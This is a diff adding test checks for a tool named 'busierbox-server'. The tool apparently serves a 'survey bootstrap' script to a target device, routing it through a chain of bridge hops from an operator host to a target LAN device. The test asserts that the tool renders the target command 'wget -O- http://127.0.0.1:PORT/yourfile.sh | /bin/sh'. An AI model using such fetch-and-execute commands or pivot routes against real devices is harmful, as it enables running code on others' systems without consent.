@@ -485,6 +485,78 @@ def main():
             print("json status missing survey bootstrap evidence", file=sys.stderr)
             print(json.dumps(survey_status, indent=2, sort_keys=True), file=sys.stderr)
             return 1
+        direct_survey_commands = (survey_status.get("target_commands_by_service") or {}).get("survey-bootstrap") or []
+        if (not direct_survey_commands or
+                direct_survey_commands[0].get("route_kind") != "direct" or
+                "wget -O- " not in direct_survey_commands[0].get("command", "") or
+                "| /bin/sh" not in direct_survey_commands[0].get("command", "")):
+            print("json status missing direct survey bootstrap target command", file=sys.stderr)
+            print(json.dumps(survey_status, indent=2, sort_keys=True), file=sys.stderr)
+            return 1
+        survey_route_port = free_port()
+        save_survey_route = run(
+            "scripts/busierbox-server",
+            "--config", str(survey_cfg),
+            "--save-bridge-profile", "survey-route",
+            "--bridge-port", str(survey_route_port),
+            "--bridge-dest-host", "127.0.0.1",
+            "--bridge-dest-port", str(survey_port),
+            "--bridge-hop", f"operator:{survey_route_port}=rack-host:19001",
+            "--bridge-hop", f"rack-host:19001=target-lan-device:{survey_port}",
+        )
+        if save_survey_route.returncode != 0 or "saved bridge profile survey-route" not in save_survey_route.stdout:
+            print("survey bridge route profile save failed", file=sys.stderr)
+            print(save_survey_route.stdout, file=sys.stderr)
+            print(save_survey_route.stderr, file=sys.stderr)
+            return 1
+        bridged_survey_proc = subprocess.Popen(
+            [
+                "scripts/busierbox-server",
+                "--config", str(survey_cfg),
+                "--transport", "survey-bootstrap",
+                "--bridge-profile", "survey-route",
+                "--timeout", "10",
+                "--one-shot",
+            ],
+            cwd=ROOT,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+        )
+        bridged_script = request_with_retry(
+            survey_port,
+            b"GET /yourfile.sh HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n",
+        )
+        bridged_out, bridged_err = bridged_survey_proc.communicate(timeout=5)
+        expected_survey_command = f"wget -O- http://127.0.0.1:{survey_route_port}/yourfile.sh | /bin/sh"
+        if (bridged_survey_proc.returncode != 0 or
+                f"http://127.0.0.1:{survey_route_port}/survey-bootstrap/result".encode("utf-8") not in bridged_script or
+                expected_survey_command not in bridged_out or
+                "bridge profile survey-route" not in bridged_out):
+            print("bridged survey bootstrap route did not render expected target command", file=sys.stderr)
+            print(bridged_out, file=sys.stderr)
+            print(bridged_err, file=sys.stderr)
+            print(bridged_script.decode("utf-8", errors="replace"), file=sys.stderr)
+            return 1
+        bridged_survey_status = json.loads(run(
+            "scripts/busierbox-server",
+            "--config", str(survey_cfg),
+            "--bridge-profile", "survey-route",
+            "--json-status",
+        ).stdout)
+        bridged_survey_command = ((bridged_survey_status.get("target_commands_by_service") or {}).get("survey-bootstrap") or [{}])[0]
+        bridged_service = (bridged_survey_status.get("services_by_name") or {}).get("survey-bootstrap") or {}
+        if (bridged_service.get("port") != survey_port or
+                bridged_service.get("route_kind") != "bridge" or
+                bridged_service.get("route_port") != survey_route_port or
+                bridged_survey_command.get("route_kind") != "bridge" or
+                bridged_survey_command.get("bridge_profile") != "survey-route" or
+                bridged_survey_command.get("route_port") != survey_route_port or
+                bridged_survey_command.get("command") != expected_survey_command or
+                "target_commands_by_route_kind" not in ((bridged_survey_status.get("api_collections") or {}).get("target_command_records") or {}).get("indexes", [])):
+            print("json status missing bridged survey bootstrap route metadata", file=sys.stderr)
+            print(json.dumps(bridged_survey_status, indent=2, sort_keys=True), file=sys.stderr)
+            return 1
 
         command_copy_file = queue_operator_dir / "last-command.txt"
         copied = run(
